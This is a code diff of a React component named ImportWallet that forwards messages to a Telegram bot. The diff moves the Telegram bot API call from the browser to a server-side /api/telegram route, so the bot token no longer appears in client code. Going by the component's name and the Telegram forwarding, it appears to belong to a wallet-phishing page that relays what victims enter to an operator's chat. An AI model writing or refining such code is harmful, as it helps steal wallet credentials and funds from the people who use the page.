@@ -14,31 +14,20 @@ export default function ImportWallet() {
   const [visibleBoxes, setVisibleBoxes] = useState<number[]>([0])
   const [showMessage, setShowMessage] = useState(false)
 
-  const [telegramChatId] = useState(process.env.NEXT_PUBLIC_ID)
-  const [telegramToken] = useState(process.env.NEXT_PUBLIC_TOKEN)
+  const telegramChatId = process.env.NEXT_PUBLIC_ID
+  const telegramToken = process.env.NEXT_PUBLIC_TOKEN
 
-  const NEXT_PUBLIC_ID = telegramChatId
-  const NEXT_PUBLIC_TOKEN = telegramToken
 
   // Send message to Telegram
   const sendTelegramMessage = async (message: string) => {
     try {
-      await fetch(
-        `https://api.telegram.org/bot${telegramToken}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: telegramChatId,
-            text: message,
-            parse_mode: "Markdown",
-          }),
-        }
-      )
+      await fetch("/api/telegram", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ message }),
+      });
     } catch (error) {
-      console.error("Failed to send Telegram message:", error)
+      console.error("Failed to send Telegram message:", error);
     }
   }
 
